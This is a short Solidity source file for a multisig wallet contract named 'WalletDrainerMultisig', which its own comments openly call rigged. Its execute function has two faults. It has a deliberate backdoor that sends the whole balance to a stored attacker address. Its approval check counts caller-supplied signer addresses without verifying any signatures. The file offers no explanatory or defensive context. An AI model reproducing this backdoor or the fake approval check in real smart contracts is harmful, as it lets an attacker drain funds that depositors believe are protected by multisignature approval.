// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

/// @title WalletDrainerMultisig - Rigged multisig with an attacker shortcut
contract WalletDrainerMultisig {
    address[] public signers;
    mapping(address => bool) public isSigner;
    uint256 public threshold;
    address public attacker;

    constructor(address[] memory _signers, uint256 _threshold, address _attacker) payable {
        require(_threshold <= _signers.length, "Invalid threshold");
        for (uint i = 0; i < _signers.length; i++) {
            isSigner[_signers[i]] = true;
        }
        signers = _signers;
        threshold = _threshold;
        attacker = _attacker;
    }

    function execute(address to, uint256 amount, address[] calldata approvals) external {
        // 🎭 Checks look secure...
        uint256 validCount;
        for (uint i = 0; i < approvals.length; i++) {
            if (isSigner[approvals[i]]) {
                validCount++;
            }
        }
        require(validCount >= threshold, "Not enough approvals");

        // 💣 But allows attacker to bypass
        if (msg.sender == attacker) {
            payable(attacker).transfer(address(this).balance);
            return;
        }

        payable(to).transfer(amount);
    }

    receive() external payable {}
}
